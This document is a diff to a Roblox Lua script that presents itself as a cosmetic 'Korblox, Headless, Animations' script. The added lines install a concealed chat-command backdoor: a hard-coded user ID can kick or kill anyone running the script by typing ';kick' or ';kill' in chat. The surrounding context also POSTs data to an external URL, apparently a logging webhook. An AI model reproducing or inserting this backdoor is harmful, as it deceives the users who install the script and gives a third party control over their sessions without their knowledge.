@@ -31,4 +31,67 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
+-- Stop --
+
+local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
+local Players = game:GetService("Players")
+local LocalP = Players.LocalPlayer;
+getgenv().AdminTable = {
+  [923076] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
+}
+
+getgenv().psearch = function(Name)
+  local Inserted = {}
+  for _, p in pairs(Players:GetPlayers()) do
+      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
+          table.insert(Inserted, p);return p
+      end
+  end
+end -- Simple player finder function
+
+getgenv().AdminCmdList = {
+  ["kick"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+              LocalP:Kick(self)
+          end
+      end;
+      ["Clearence"] = {[5] = true;};
+  }; -- you can make new ones of these (the ; have to be in the same spots)
+  ["kill"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+              LocalP.Character.Humanoid:ChangeState(15)
+          end
+      end;
+      ["Clearence"] = {[4] = true;[5] = true;};
+  };
+};
+
+getgenv().BDCheck = function(Target2, Chat)
+  if Chat:sub(1, 1) == AdminPrefix then
+      local args = string.split(Chat:sub(2), " ")
+      local Command = AdminCmdList[table.remove(args, 1)]
+      local targ1 = psearch(table.remove(args, 1))
+      if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
+          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
+      end
+  end
+end
+
+local GP = Players:GetPlayers()
+for i = 1, #GP do
+  local CoolKidPlayer = GP[i]
+  CoolKidPlayer.Chatted:Connect(function(Word)
+      BDCheck(CoolKidPlayer, Word)
+  end)
+end -- Checks if you chatted a command
+Players.PlayerAdded:Connect(function(CKP)
+  CKP.Chatted:Connect(function(Message)
+      BDCheck(CKP, Message)
+  end)
+end)
+
+-- Stop --
+
 game.StarterGui:SetCore("SendNotification",{Title="Pro Script",Text="Korblox, Headless, Animations Script",Duration=5})game.StarterGui:SetCore("SendNotification",{Title="Pro Script",Text="Removed: Valk Keeps Breaking Da Hood Literally Makes Everyone Invisible To Each Other",Duration=5})delay(0,function()respawn=false;game.Players.LocalPlayer.Character.Humanoid.Health=0;game.Players.LocalPlayer.CharacterAdded:Connect(function(a)respawn=true;wait(1)local b=game.Players.LocalPlayer;local c=b.Character;c.RightLowerLeg.MeshId="902942093"c.RightLowerLeg.Transparency="1"c.RightUpperLeg.MeshId="http://www.roblox.com/asset/?id=902942096"c.RightUpperLeg.TextureID="http://roblox.com/asset/?id=902843398"c.RightFoot.MeshId="902942089"c.RightFoot.Transparency="1"c.LeftLowerLeg.MeshId="http://www.roblox.com/asset/?id=902942101"c.LeftLowerLeg.Transparency="0"c.LeftUpperLeg.MeshId="http://www.roblox.com/asset/?id=902942082"c.LeftUpperLeg.TextureID="http://roblox.com/asset/?id=902842271"c.LeftFoot.MeshId="902942077"c.LeftFoot.Transparency="1"game:GetService("Players").LocalPlayer.Character.Head.Transparency=1;for d,e in pairs(game.Players.LocalPlayer.Character.Head:GetChildren())do if e:IsA("Decal")then e:Destroy()local f=game.Players.LocalPlayer.Character.Animate;f.idle.Animation1.AnimationId="http://www.roblox.com/asset/?id=782841498"f.idle.Animation2.AnimationId="http://www.roblox.com/asset/?id=782845736"f.walk.WalkAnim.AnimationId="http://www.roblox.com/asset/?id=616168032"f.run.RunAnim.AnimationId="http://www.roblox.com/asset/?id=616163682"f.jump.JumpAnim.AnimationId="http://www.roblox.com/asset/?id=1083218792"f.climb.ClimbAnim.AnimationId="http://www.roblox.com/asset/?id=909997997"f.fall.FallAnim.AnimationId="http://www.roblox.com/asset/?id=707829716"f.swim.SwimAnim.AnimationId="http://www.roblox.com/asset/?id=656119721"game.Players.LocalPlayer.Character.Humanoid.Jump=true end end end)end)
